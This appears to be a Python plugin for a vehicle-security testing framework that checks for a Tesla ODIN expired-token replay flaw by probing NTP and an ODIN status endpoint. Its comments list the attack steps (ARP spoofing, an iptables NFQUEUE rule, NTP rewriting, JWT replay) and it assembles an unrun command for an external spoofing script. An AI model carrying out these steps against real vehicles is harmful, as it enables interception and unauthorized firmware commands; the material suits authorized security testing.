#!/usr/bin/env python3
"""CVE-2022-42007 – Tesla ODIN expired-token replay via NTP spoofing.

Public PoC source: https://github.com/AnalyticETH/tesla-security-research
Technique (02-EXPIRED-TOKEN-REPLAY-VIA-NTP.md + tools/ntpspoof.py):
  The ODIN firmware-update server validates a signed JWT.  The JWT carries an
  expiry time checked against the vehicle's system clock.  An attacker on the
  same Wi-Fi segment can ARP-spoof the vehicle, intercept NTP replies and
  rewrite the year to before the token expiry, then replay a previously
  captured update token.

  Original ntpspoof.py uses:
    - arpspoof   (dsniff)
    - iptables NFQUEUE
    - scapy + netfilterqueue
  to intercept/modify NTP response packets in flight.

Safety gate: is_disruptive=True (ARP-spoofing disruptive to LAN).
  This plugin runs a read-only MITM pre-flight check (ARP table inspection
  + NTP probe) unless allow_disruptive=true.
"""
from __future__ import annotations

import shutil
import socket
import struct
import subprocess
import time
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 4,
    "cve": "CVE-2022-42007",
    "year": 2022,
    "domain": "network",
    "vendor_product": "Tesla Model 3/Y infotainment MCU",
    "component": "ODIN firmware-update JWT validation",
    "type": "Expired-token replay via NTP clock manipulation",
    "summary": (
        "ODIN validates update JWTs against the vehicle's system clock.  By "
        "ARP-spoofing the vehicle and rewriting NTP responses to a past date "
        "(before the JWT's exp claim), a captured update token can be replayed "
        "indefinitely, allowing replay of arbitrary signed firmware commands."
    ),
    "source_url": "https://github.com/AnalyticETH/tesla-security-research",
    "requires_manual_review": True,
    # Full NTP-spoof logic is in tools/ntpspoof.py.
    # Key steps:
    #   1. arpspoof -i <iface> -t <router> <target>
    #   2. iptables -t raw -A PREROUTING -p udp -d <subnet>/24 --sport 123 -j NFQUEUE --queue-num 99
    #   3. scapy NTP packet rewriter sets year to 2021-07-20 (before token expiry)
    #   4. Replay captured ODIN API call with expired JWT
}

NTPSPOOF_SCRIPT = Path(__file__).parent.parent.parent / \
    "public_poc_sources/repos/AnalyticETH__tesla-security-research/tools/ntpspoof.py"
ODIN_PORT = 8080


def _ntp_probe(target: str) -> dict:
    """Send a minimal NTP client request to the target and inspect the response."""
    result = {"ntp_responds": False, "ntp_version": None, "detail": ""}
    NTP_PORT = 123
    # NTP client mode=3, version=3, stratum=0
    ntp_req = b"\x1b" + b"\x00" * 47
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(4)
        sock.sendto(ntp_req, (target, NTP_PORT))
        data, _ = sock.recvfrom(1024)
        sock.close()
        if len(data) >= 48:
            result["ntp_responds"] = True
            result["ntp_version"] = (data[0] >> 3) & 0x7
    except socket.timeout:
        result["detail"] = "NTP probe timed out (target may not run NTP server)."
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _check_odin_api(target: str) -> dict:
    """Try to reach the ODIN HTTP endpoint and collect headers."""
    import urllib.request, urllib.error
    result = {"reachable": False, "server_header": "", "detail": ""}
    url = f"http://{target}:{ODIN_PORT}/api/v1/status"
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=5) as resp:
            result["reachable"] = True
            result["server_header"] = resp.getheader("Server", "")
            result["status_code"] = resp.status
    except urllib.error.HTTPError as e:
        result["reachable"] = True
        result["status_code"] = e.code
        result["detail"] = str(e)
    except Exception as exc:
        result["detail"] = str(exc)
    return result


def _run_poc(plugin):
    target = (plugin.params or {}).get("target_ip", "192.168.90.100")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    ntp   = _ntp_probe(target)
    odin  = _check_odin_api(target)

    evidence = {
        "cve": "CVE-2022-42007",
        "target": target,
        "odin_reachable": odin["reachable"],
        "odin_status": odin.get("status_code"),
        "odin_server": odin.get("server_header"),
        "ntp_responds": ntp["ntp_responds"],
        "ntp_version": ntp["ntp_version"],
        "ntpspoof_script": str(NTPSPOOF_SCRIPT),
        "ntpspoof_present": NTPSPOOF_SCRIPT.exists(),
    }

    if allow_disruptive:
        tools_ok = all(shutil.which(t) for t in ["arpspoof", "iptables"])
        evidence["arpspoof_tools_present"] = tools_ok
        if tools_ok and NTPSPOOF_SCRIPT.exists():
            evidence["would_run"] = (
                f"sudo python3 {NTPSPOOF_SCRIPT} {target} <iface>  "
                "# then replay captured ODIN JWT"
            )
        else:
            evidence["would_run"] = (
                "BLOCKED – missing arpspoof/iptables or ntpspoof.py not found."
            )

    vulnerable = odin["reachable"] and ntp["ntp_responds"]
    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "AnalyticETH/tesla-security-research / 02-EXPIRED-TOKEN-REPLAY + tools/ntpspoof.py",
    }


class Poc70CVE202242007OdinNtpExpiredTokenReplayAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-NET-070"
    meta_poc_name   = "CVE-2022-42007 Tesla ODIN NTP-spoof Expired-Token Replay"
    meta_cve_id     = "CVE-2022-42007"
    meta_severity   = "High"
    meta_protocol   = "http+ntp"
    meta_target_os  = ["linux"]
    meta_required_params = ["target_ip"]
    meta_profiles   = ["network"]
    meta_source_url = "https://github.com/AnalyticETH/tesla-security-research"
    meta_attack_surface = "Tesla MCU ODIN JWT time-validation bypass via NTP spoofing"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_ip"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
